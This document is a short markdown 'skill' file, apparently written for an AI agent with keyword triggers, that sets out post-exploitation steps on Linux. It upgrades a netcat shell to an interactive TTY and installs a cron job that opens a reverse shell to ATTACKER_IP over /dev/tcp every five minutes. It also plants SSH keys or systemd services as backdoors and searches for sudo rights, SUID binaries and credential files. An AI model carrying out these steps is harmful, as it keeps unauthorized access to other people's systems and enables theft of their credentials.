# Skill: Shell Persistence & Stabilization
# Trigger: shell, reverse, nc, listener, /bin/bash

### Phase 1: Interactive TTY Upgrade
If you have a dumb shell (e.g. from `nc`), upgrade it:
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `export TERM=xterm`
3. Background the shell (`Ctrl+Z`), run `stty raw -echo; fg`, then `reset`.

### Phase 2: Persistence (Linux)
- **Crontab:** `(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'") | crontab -`
- **SSH Key:** Add your public key to `~/.ssh/authorized_keys`.
- **Systemd:** Create a simple service in `/etc/systemd/system/`.

### Phase 3: Post-Exploitation Fast Check
- `sudo -l` (Check for nopasswd)
- `find / -perm -u=s -type f 2>/dev/null` (Find SUID binaries)
- Check for `.bash_history`, `.ssh/`, and `config` files.
